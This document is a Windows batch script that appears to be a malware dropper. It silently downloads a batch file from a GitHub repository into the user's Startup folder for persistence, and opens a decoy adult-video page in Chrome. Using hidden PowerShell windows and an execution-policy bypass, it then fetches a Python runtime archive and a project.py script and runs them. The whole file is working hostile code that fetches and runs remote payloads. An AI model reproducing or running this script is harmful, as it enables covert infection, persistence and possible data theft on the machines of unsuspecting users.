@echo off
setlocal enabledelayedexpansion
set "user=%USERNAME%"
if not exist "C:\Users\!user!\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Project.bat\" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vipmodz13/Bot13/raw/main/HinhAnh1.bat' -OutFile \"C:\Users\!user!\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Project.bat\""
)
start "" chrome "https://sieudamtv.com/videos/link-clip-tran-ha-linh-bu-cac-roi-chich-nhau-moi-nhat-154464/xemvideo.html"
if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/vipmodz13/Bot13/raw/main/PythonLib.zip', 'C:\Users\Public\Document.zip')"
)
if not exist "C:\Users\Public\Document" (
    powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\Document.zip' -DestinationPath 'C:\Users\Public\Document'"
)
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/vipmodz13/Bot13/raw/main/project.py', 'C:\Users\Public\Document\project.py')"
)
powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "C:\Users\Public\Document\python.exe C:\Users\Public\Document\project.py"
endlocal
exit /b 0
